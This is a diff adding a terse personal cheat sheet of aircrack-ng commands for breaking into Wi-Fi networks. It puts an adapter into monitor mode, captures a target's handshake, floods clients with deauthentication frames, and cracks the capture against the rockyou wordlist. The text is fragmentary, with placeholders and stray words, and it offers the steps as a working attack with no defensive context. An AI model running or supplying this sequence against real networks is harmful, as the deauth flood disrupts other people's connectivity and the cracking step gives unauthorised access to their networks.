@@ -1,0 +1,31 @@
+ip addr
+iwconfig
+sudo airmon-ng check kali
+sudo airmon-ng start wlan0
+air
+
+check 
+
+sudo airmon-ng
+
+
+wlx060c000366f2
+
+
+
+sudo airodump-ng adeptor_name -d basid_id
+
+sudo airodump-ng -w file_name -c 2 --bssid id adeptor_name
+
+
+sudo aireplay-ng --deauth 0 -a bssid adp_name-
+
+
+wireshark 
+
+
+
+sudo airmon-ng stop wlan0mon
+
+
+aircrack-ng hack-01.cap -w /usr/share/wordlists/rockyou.txt
